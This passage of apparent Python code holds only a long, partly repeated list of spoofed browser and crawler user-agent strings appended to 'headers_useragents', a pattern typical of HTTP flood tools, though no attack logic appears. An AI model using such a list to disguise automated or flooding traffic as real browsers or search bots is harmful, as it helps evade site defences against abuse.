                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
                                    	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
                                    	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
                                    	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
                                    	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
                                    	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
